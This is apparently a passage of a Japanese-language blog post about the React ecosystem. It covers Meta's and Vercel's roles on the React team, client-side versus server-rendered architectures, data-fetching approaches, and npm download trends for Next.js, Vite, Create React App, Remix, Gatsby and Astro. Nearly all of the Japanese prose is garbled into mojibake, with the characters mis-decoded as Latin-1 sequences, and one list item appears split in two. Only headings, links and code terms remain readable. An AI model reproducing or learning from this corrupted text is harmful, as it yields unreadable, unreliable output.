<p>Metaè‡ªèº«ã®Reactã®ä½¿ç”¨ã¯åºƒç¯„ã§ã‚ã‚Šã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ä½¿ç”¨æ–¹æ³•ã¨ã¯ç•°ãªã‚Šã¾ã™ã€‚Metaã¯ç‹¬è‡ªã®å·¨å¤§ãªã‚µãƒ¼ãƒãƒ¼ã‚¤ãƒ³ãƒ•ãƒ©ã‚’æŒã£ã¦ãŠã‚Šã€ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã€ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãªã©ã®ãŸã‚ã®æ¨™æº–çš„ãªæŠ€è¡“ã‚’å«ã‚“ã§ã„ã¾ã™ã€‚Metaã¯GraphQLãƒ—ãƒ­ãƒˆã‚³ãƒ«ã€ãŠã‚ˆã³Relay GraphQLã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’ç™ºæ˜ã—ã€ãã‚Œã‚‰ã‚’Reactã‚³ãƒ¼ãƒ‰ã§é »ç¹ã«ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€Metaã®Reactä½¿ç”¨ãŒã€ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã€çŠ¶æ…‹ç®¡ç†ã€ã‚¹ã‚¿ã‚¤ãƒªãƒ³ã‚°ã€ã¾ãŸã¯ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ä»–ã®éƒ¨åˆ†ã§ä¸€èˆ¬çš„ãªä»–ã®å•é¡Œã«å¯¾ã—ã¦ã€ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ã»ã¨ã‚“ã©å¿…è¦ã¨ã—ãªã„ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚</p>
<h3>Vercel, Next, and React</h3>
<p>Vercelã¯ä¸»ã«Webã‚¢ãƒ—ãƒªã®ãƒ›ã‚¹ãƒ†ã‚£ãƒ³ã‚°ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã§ã™ã€‚å½¼ã‚‰ã¯ä¸»ã«ã€ã‚ˆã‚Šå¤šãã®äººã€…ãŒå½¼ã‚‰ã®ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã§ã‚¢ãƒ—ãƒªã‚’ãƒ›ã‚¹ãƒˆã™ã‚‹ã“ã¨ã§åç›Šã‚’ä¸Šã’ã€ã‚ˆã‚Šç°¡å˜ã«ä½¿ç”¨ã§ãã‚‹ã¨ã„ã†åˆ©ä¾¿æ€§ã‚’ã‚‚ãŸã‚‰ã™ã“ã¨ã§èª²é‡‘ã‚’ä¿ƒã—ã¦ã„ã¾ã™ã€‚å½¼ã‚‰ã¯Next.jsãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®æ§‹ç¯‰ï¼ˆãŠã‚ˆã³ä»–ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ã‚µãƒãƒ¼ãƒˆï¼‰ã«è†¨å¤§ãªã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°æ™‚é–“ã‚’è²»ã‚„ã—ã€Vercelã‚¤ãƒ³ãƒ•ãƒ©ä¸Šã§Nextã‚¢ãƒ—ãƒªã‚’ç°¡å˜ã«ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã—ã¦ãƒ‡ãƒ—ãƒ­ã‚¤ã§ãã‚‹ã‚ˆã†ã«ã—ã¦ã„ã¾ã™ã€‚</p>
<p>Vercelã®CEOã§ã‚ã‚‹Guillermo Rauchã¯ã€Reactã¨ãã®èƒ½åŠ›ã®é•·å¹´ã®ä¿¡å¥‰è€…ã§ã‚ã‚Šã€ãã‚Œã¯å½¼ã®2015å¹´ã®ãƒ–ãƒ­ã‚°æŠ•ç¨¿<a href="https://rauchg.com/2015/pure-ui">Pure UI</a>ãŒReactã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ãƒ¢ãƒ‡ãƒ«ã®åŠ›ã«ã¤ã„ã¦èªã£ã¦ã„ã‚‹ã“ã¨ã‹ã‚‰ã‚‚ç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p>2021å¹´å¾ŒåŠã€<a href="https://vercel.com/blog/supporting-the-future-of-react">Reactãƒãƒ¼ãƒ ã®ãƒªãƒ¼ãƒ‰ã§ã‚ã£ãŸSebastian MarkbageãŒMetaã‚’å»ã‚Šã€Vercelã«å‚åŠ ã—ã¾ã—ãŸ</a>ã€‚ã“ã‚Œã¯ã€ãƒ•ãƒ«ã‚¿ã‚¤ãƒ ã®Reactã‚³ã‚¢ãƒãƒ¼ãƒ ãƒ¡ãƒ³ãƒãƒ¼ãŒMetaä»¥å¤–ã®ã©ã“ã‹ã§åƒãåˆã‚ã¦ã®äº‹ä¾‹ã§ã—ãŸã€‚å¾Œã«ã€ã‚³ã‚¢ãƒãƒ¼ãƒ ãƒ¡ãƒ³ãƒãƒ¼ã®Andrew Clarkã¨å…ƒReactçµ„ç¹”ãƒªãƒ¼ãƒ‰ã®Tom OcchinoãŒå½¼ã«åŠ ã‚ã‚Šã¾ã—ãŸã€‚Reactãƒãƒ¼ãƒ ã¯ã™ã§ã«Reactå†…éƒ¨ã§RSCæ©Ÿèƒ½ã«é–¢ã™ã‚‹é‡è¦ãªãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ”ãƒ³ã‚°ã‚’è¡Œã£ã¦ãŠã‚Šã€Next.jsã®App Routerã‚’è¨­è¨ˆã—ã¦ã„ã¾ã—ãŸã€‚ãã—ã¦Vercelã¯è¿½åŠ ã®ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ã‚’Reactã®ã‚³ã‚¢ã¨ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°æ©Ÿèƒ½ã«è²¢çŒ®ã•ã›å§‹ã‚ã¾ã—ãŸã€‚</p>
<p>ä»Šæ—¥ã€<a href="https://react.dev/community/team">Reactãƒãƒ¼ãƒ ã¯Metaã¨Vercelã®é–“ã§åˆ†ã‹ã‚Œã¦ã„ã¾ã™</a>ï¼ˆå¤§å¤šæ•°ã¯ã¾ã Metaã«ã„ã¾ã™ï¼‰ã€åŠ ãˆã¦å¤–éƒ¨ã«æ•°äººã®ãƒãƒ¼ãƒ ãƒ¡ãƒ³ãƒãƒ¼ã¾ãŸã¯ç¶™ç¶šçš„ãªã‚³ãƒ³ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚¿ãƒ¼ãŒã„ã¾ã™ã€‚</p>
<h2>Reactã®åˆ©ç”¨ãƒ‘ã‚¿ãƒ¼ãƒ³</h2>
<h3>æ¨™æº–çš„ãªReactã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£</h3>
<p>Reactï¼ˆç‰¹ã«ReactDOMï¼‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªè‡ªä½“ã¯ã€ãƒšãƒ¼ã‚¸å†…ã§ã©ã®ã‚ˆã†ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‹ã‚’æ°—ã«ã—ã¾ã›ã‚“ã€‚ã»ã¼ç©ºã®HTMLãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ãƒ¼ã‚’æä¾›ã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã§ãƒšãƒ¼ã‚¸å…¨ä½“ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ç”Ÿæˆã™ã‚‹Reactãƒ„ãƒªãƒ¼ã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã—ã¦ã€ã‚·ãƒ³ã‚°ãƒ«ãƒšãƒ¼ã‚¸ã‚¢ãƒ—ãƒªï¼ˆã€ŒSPAã€ï¼‰ã¨ã—ã¦æ©Ÿèƒ½ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ãŒå„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å‹•çš„ã«å¿œç­”ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ï¼ˆã€ŒSSRã€ï¼‰ã‚„ã€ãƒ“ãƒ«ãƒ‰æ™‚ã«é™çš„ãªHTMLãƒšãƒ¼ã‚¸ã‚’äº‹å‰ã«ç”Ÿæˆã™ã‚‹é™çš„ã‚µã‚¤ãƒˆã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆã€ŒSSGã€ï¼‰ã«Reactã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ä»»æ„ã®è¨€èªã‚„ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ï¼ˆPython + Djangoã€Ruby + Railsã€PHP + WordPressã€.NETãªã©ï¼‰ã‚’ä½¿ç”¨ã—ã¦é™çš„ã¾ãŸã¯ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚ŒãŸHTMLãƒšãƒ¼ã‚¸ã‚’æä¾›ã—ã€ãƒšãƒ¼ã‚¸å…¨ä½“ã«Reactã®æ–­ç‰‡ã‚’æ•£ã‚Šã°ã‚ã¦ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚</p>
<p>ã¨ã¯ã„ãˆã€2015å¹´ã¾ã§ã«ã¯Reactã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®SPAã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã§æœ€ã‚‚ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã—ãŸã€‚ä½•äº‹ã«ã‚‚ãƒˆãƒ¬ãƒ¼ãƒ‰ã‚ªãƒ•ãŒã‚ã‚‹ã‚ˆã†ã«ã€ã“ã‚Œã‚‰ã«ã‚‚é•·æ‰€ã¨çŸ­æ‰€ãŒã‚ã‚Šã¾ã—ãŸã€‚ãƒšãƒ¼ã‚¸ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®ç”ŸæˆãŒå®¹æ˜“ã«ãªã‚Šï¼ˆå…¨ã¦Reactã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆï¼‰ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ã‚·ãƒ§ãƒ³ãŒé«˜é€ŸåŒ–ã—ï¼ˆãƒšãƒ¼ã‚¸å…¨ä½“ã®ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ã®ä»£ã‚ã‚Šã«ã‚¯ãƒªãƒƒã‚¯ã‚„ãƒ«ãƒ¼ãƒˆå¤‰æ›´ã§åˆ¥ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’è¡¨ç¤ºï¼‰ã€ã‚ˆã‚Šãƒªãƒƒãƒãªã‚¢ãƒ—ãƒªä½“é¨“ãŒå¯èƒ½ã«ãªã‚Šã¾ã—ãŸã€‚ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãŒä½•ã§ã‚ã‚Œï¼ˆJSã€Javaã€PHPã€.NETã€Pythonï¼‰ã€JSON APIã‚’å…¬é–‹ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ•ã‚§ãƒƒãƒã™ã‚‹ã ã‘ã§ã—ãŸã€‚ã—ã‹ã—ã€æœ€åˆã®ãƒšãƒ¼ã‚¸ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã®ãŒé…ãã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ãŒãƒã‚¤ãƒ†ã‚£ãƒ–ã®ãƒ–ãƒ©ã‚¦ã‚¶ã®å‹•ä½œã¨ã¯ç•°ãªã‚‹ä¸è‡ªç„¶ãªã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ã‚·ãƒ§ãƒ³ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ã‚‚ã‚ã‚Šã¾ã—ãŸã€‚</p>
<p>ã“ã‚Œã‚‰ã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§ã®ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã¯ã€å½“åˆã¯ã‹ãªã‚Šæ‰‹å‹•ã§ã‚ã‚Šã€å‰¯ä½œç”¨ã«ãŠã‘ã‚‹æ…é‡ãªãƒ­ã‚¸ãƒƒã‚¯ã‚’å¿…è¦ã¨ã—ã¾ã—ãŸï¼ˆä¾‹ãˆã°ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒæœ€åˆã«ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚ŒãŸã¨ãã«ãƒ‡ãƒ¼ã‚¿ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«<code class="language-text">componentDidMount</code>ã§ãƒ•ã‚§ãƒƒãƒã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ãªã©ï¼‰ã€‚ã“ã‚Œã¯ã—ã°ã—ã°ã€ãƒ•ã‚§ãƒƒãƒã¨ã‚­ãƒ£ãƒƒã‚·ãƒ³ã‚°ã‚’å‡¦ç†ã™ã‚‹ãŸã‚ã«Reduxãƒ™ãƒ¼ã‚¹ã®ãƒ­ã‚¸ãƒƒã‚¯ã§è¡Œã‚ã‚Œã¾ã—ãŸãŒã€ãã®ã‚³ãƒ¼ãƒ‰ã¯é€šå¸¸ã€ãƒœã‚¤ãƒ©ãƒ¼ãƒ—ãƒ¬ãƒ¼ãƒˆã¨è¤‡é›‘ã•ã«æº€ã¡ã¦ã„ã¾ã—ãŸã€‚å¾Œã«ã€React Queryã€Apolloã€SWRã€RTK Queryã®ã‚ˆã†ãªå°‚ç”¨ã®ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§ã®ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã‚’å¤§å¹…ã«ç°¡ç´ åŒ–ã—ã€å°‚ç”¨ã®<code class="language-text">useQuery</code>ãƒ•ãƒƒã‚¯ã¨äº‹å‰æ§‹ç¯‰ã•ã‚ŒãŸã‚­ãƒ£ãƒƒã‚·ãƒ³ã‚°ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’æä¾›ã—ã¾ã—ãŸã€‚</p>
<p>Nextã‚„Remixã®ã‚ˆã†ãªãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€Reactã‚’ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹ãŸã‚ã®æ¨™æº–åŒ–ã•ã‚ŒãŸã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’æä¾›ã—ã€çµ„ã¿è¾¼ã¿ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°è¦ç´„ã‚’å‚™ãˆã¦ã„ã¾ã—ãŸã€‚ã—ã‹ã—ã€ã‚µãƒ¼ãƒãƒ¼ãƒ™ãƒ¼ã‚¹ã®ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã«é–¢ã™ã‚‹è¦ç´„ã¯ã‚ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚Nextã¯ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¨ä¸¦è¡Œã—ã¦ãƒ•ã‚§ãƒƒãƒã™ã‚‹ãŸã‚ã®éåŒæœŸé–¢æ•°ã‚’æŒ‡å®šã™ã‚‹<code class="language-text">getServerSideProps</code>ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’ç™ºæ˜ã—ã¾ã—ãŸã€‚Remixã¯å¾Œã«åŒæ§˜ã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã§ã€Œãƒ­ãƒ¼ãƒ€ãƒ¼ã€ã‚’ç™ºæ˜ã—ã¾ã—ãŸã€‚ã©ã¡ã‚‰ã‚‚Reactã®æ€æƒ³ã«åˆã£ã¦ã„ãªã„æ„Ÿã˜ãŒã—ã¾ã—ãŸã€‚</p>
<p>ã“ã‚Œã¯ã€Reactã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã«ãŠã‘ã‚‹ä¸€èˆ¬çš„ãªè€ƒãˆæ–¹ã®è»¢æ›ã«ã¤ãªãŒã‚Šã¾ã—ãŸã€‚ãƒšãƒ¼ã‚¸ã®èª­ã¿è¾¼ã¿ä½“é¨“ã‚’æ”¹å–„ã—ã€ãƒšãƒ¼ã‚¸ã«å¿…è¦ãªJSã®é‡ã‚’æœ€å°é™ã«æŠ‘ãˆã‚‹ãŸã‚ã«ã€SSRãƒ™ãƒ¼ã‚¹ã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã¸ã®æ¨é€²ãŒå¼·ã¾ã£ã¦ã„ã¾ã™ã€‚ã¾ãŸã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã§ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦æ€§ã‚’ãªãã™å‹•ãã‚‚ã‚ã‚Šã¾ã™ã€‚Reactãƒãƒ¼ãƒ ã¯ã€ãƒšãƒ¼ã‚¸ã®èª­ã¿è¾¼ã¿ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’æ”¹å–„ã™ã‚‹ãŸã‚ã«ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã«ãŠã‘ã‚‹ã€Œã‚¦ã‚©ãƒ¼ã‚¿ãƒ¼ãƒ•ã‚©ãƒ¼ãƒ«ã€ã«å£°é«˜ã«åå¯¾ã—ã¦ãŠã‚Šã€React Routerã‚„TanStack Routerã®ã‚ˆã†ãªã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®ãƒ«ãƒ¼ã‚¿ãƒ¼ã§ã•ãˆã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãƒ„ãƒªãƒ¼ã®å¥¥æ·±ãã§ãƒ•ã‚§ãƒƒãƒã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã®ã§ã¯ãªãã€ãƒ«ãƒ¼ãƒˆ/ãƒšãƒ¼ã‚¸ãƒ¬ãƒ™ãƒ«ã§ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ—ãƒªãƒ•ã‚§ãƒƒãƒã™ã‚‹æ–¹æ³•ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚</p>
<h2>Reactãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«ã®åˆ©ç”¨çŠ¶æ³</h2>
<p>ã„ãã¤ã‹ã®ä¸»è¦ãªReacté–¢é€£ã®ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«ã¨ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰çµ±è¨ˆã‚’è¦‹ã¦ã€ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã«ãŠã‘ã‚‹ä½¿ç”¨è¦æ¨¡ã®çµŒæ™‚çš„ãªå¤‰åŒ–ã¨ç¾çŠ¶ã‚’æŠŠæ¡ã™ã‚‹ä¾¡å€¤ãŒã‚ã‚Šã¾ã™ã€‚
å¤§ã¾ã‹ã«è¨€ã†ã¨ã€ä»Šæ—¥ã®ä¸»è¦ãªé¸æŠè‚¢ã¯ã€ãƒã‚¤ãƒ³ãƒ‰ã‚·ã‚§ã‚¢ãŠã‚ˆã³ï¼ã¾ãŸã¯ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰æ•°ã®è¦³ç‚¹ã‹ã‚‰ä»¥ä¸‹ã®é€šã‚Šã§ã™ã€‚</p>
<ul>
<li><a href="https://nextjs.org/">Next.js</a> (SSR / SSG / RSC / SPA)</li>
<li><a href="https://remix.run/">Remix</a> / React-Router v7 (SSR / SSG / SPA)</li>
<li><a href="https://vite.dev/">Vite</a> (SPA)</li>
<li><a href="https://create-react-app.dev/">Create React App</a> (SPA)</li>
</ul>
<p>ã¾ãŸã€Viteè‡ªä½“ã¯Vueã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã‹ã‚‰å§‹ã¾ã£ãŸã‚‚ã®ã®ã€å¤šãã®ç•°ãªã‚‹ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹æ¨™æº–åŒ–ã•ã‚ŒãŸåºƒãä½¿ç”¨ã•ã‚Œã‚‹ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«ã«ãªã£ãŸã“ã¨ã«ã‚‚æ³¨ç›®ã™ã‚‹ä¾¡å€¤ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€Reactã‚µãƒãƒ¼ãƒˆç”¨ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’å«ã‚€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã‚‚ã‚ã‚Šã€ã•ã¾ã–ã¾ãªãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«ã¨ã—ã¦é¸ã°ã‚Œã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ã¯Remix / React-Routerã‚‚å«ã¾ã‚Œã¦ãŠã‚Šã€æœ€è¿‘ã€å†…éƒ¨ã§ESBuildã‚’ä½¿ç”¨ã™ã‚‹ã®ã‚’ã‚„ã‚ã€SSRã¨SSGã®ã‚µãƒãƒ¼ãƒˆã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã®Viteãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’æä¾›ã™ã‚‹ã‚ˆã†ã«åˆ‡ã‚Šæ›¿ãˆã¾ã—ãŸã€‚</p>
<p>ä»¥ä¸‹ã¯ã€<a href="https://npm-stat.com/charts.html?package=react-dom&#x26;package=next&#x26;package=%40vitejs%2Fplugin-react&#x26;package=%40remix-run%2Freact&#x26;package=react-scripts&#x26;from=2018-01-01&#x26;to=2025-05-31">éå»æ•°å¹´é–“ã®ã“ã‚Œã‚‰ã®ãƒ„ãƒ¼ãƒ«ã®NPMãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰æ•°ã®ã‚°ãƒ©ãƒ•</a>ã§ã™ã€‚ReactDOMã‚’ã‚¹ã‚±ãƒ¼ãƒ«ã¨ã—ã¦ç¤ºã—ã¦ã„ã¾ã™ã€‚</p>
<p><img src="https://blog.isquaredsoftware.com/images/2025-06-react-community-2025/react-frameworks-usage.png"></p>
<p>æœ€è¿‘ã¾ã§ã€Reactãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯Gatsbyã‚’Webå‘ã‘ã®æ¨å¥¨ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¨ã—ã¦ã€Expoã‚’React Nativeå‘ã‘ã®å”¯ä¸€ã®æ¨å¥¨ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¨ã—ã¦ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ã¦ã„ã¾ã—ãŸã€‚Gatsbyã¯Netlifyã«è²·åã•ã‚ŒãŸå¾Œã€äº‹å®Ÿä¸Šãã®å½¹ç›®ã‚’çµ‚ãˆã¾ã—ãŸã€‚ä¸€æ–¹ã€Astroã¯Reactã‚’å«ã‚€å¤šãã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ã€ã‚ˆã‚Šæ±ç”¨çš„ãªé™çš„ã‚µã‚¤ãƒˆæŒ‡å‘ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚æ¯”è¼ƒã®ãŸã‚ã«å½¼ã‚‰ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰çµ±è¨ˆã‚’ä»¥ä¸‹ã«ç¤ºã—ã¾ã™ã€‚</p>
<p><img src="https://blog.isquaredsoftware.com/images/2025-06-react-community-2025/react-frameworks-usage-2.png"></p>
<h3>ã“ã‚Œã‚‰ã®çµ±è¨ˆã‹ã‚‰ã®ã„ãã¤ã‹ã®è¦ç‚¹ï¼š</h3>
<ul>
<li>
<p>Next.jsãŒæœ€ã‚‚åºƒãä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹</p>
</li>
<li>
<p>Viteã®Reactãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ç€å®Ÿã«æˆé•·ã—ã¦ãŠã‚Šã€ç¾åœ¨ã§ã¯2ç•ªç›®ã«åºƒãä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹</p>
</li>
<li>
<p>Reacté–¢é€£ã®ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«ã§ã‚ã‚‹</p>
</li>
<li>
<p>CRAã®ä½¿ç”¨ã¯2023å¹´åŠã°ã«ãƒ”ãƒ¼ã‚¯ã«é”ã—ã€ãã‚Œä»¥é™æ¸›å°‘ã—ã¦ã„ã‚‹ãŒã€ä¾ç„¶ã¨ã—ã¦ã‹ãªã‚Šã®ä½¿ç”¨é‡ãŒã‚ã‚‹</p>
</li>
<li>
<p>Remixã¯ç¾æ™‚ç‚¹ã§å£ã‚³ãƒŸã§ã®è©•ä¾¡ã¯é«˜ã„ã‚‚ã®ã®ã€è¦æ¨¡ã¯æ¯”è¼ƒçš„å°ã•ã‚ã§ã™ã€‚React Routerã¯éå¸¸ã«åºƒãä½¿ã‚ã‚Œã¦ã„ã¾ã™ãŒã€ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãƒ¢ãƒ¼ãƒ‰ã€ã«å¯¾å¿œã—ãŸæ–°ã—ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¯ã€ã¾ã ãã‚Œã»ã©æ™®åŠã—ã¦ã„ã¾ã›ã‚“ã€‚</p>
</li>
<li>
<p>Gatsbyã¯Nextã€CRAã€Viteã»ã©ã®å‹¢ã„ã¯ãªãã€æœ€è¿‘Astroã«è¿½ã„è¶Šã•ã‚ŒãŸ</p>
</li>
<li>
<p>Astroã¯Reactå›ºæœ‰ã§ã¯ãªã„ãŒã€Remixã¨ã»ã¼åŒã˜ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰æ•°ãŒã‚ã‚‹</p>
</li>
<li>
<p>Viteã¨CRAã‚’åˆã‚ã›ã‚‹ã¨Nextã®ä½¿ç”¨é‡ã«åŒ¹æ•µã—ã€Reactã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã«ã¯ä¾ç„¶ã¨ã—ã¦ãƒ—ãƒ¬ãƒ¼ãƒ³ãªSPAãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«å¯¾ã™ã‚‹å¼·ã„éœ€è¦ãŒã‚ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã‚‹</p>
</li>
</ul>
<h2>React Server Componentsã®å†…å´</h2>
<h3>React Server Componentã®é–‹ç™ºã¨Vercel</h3>
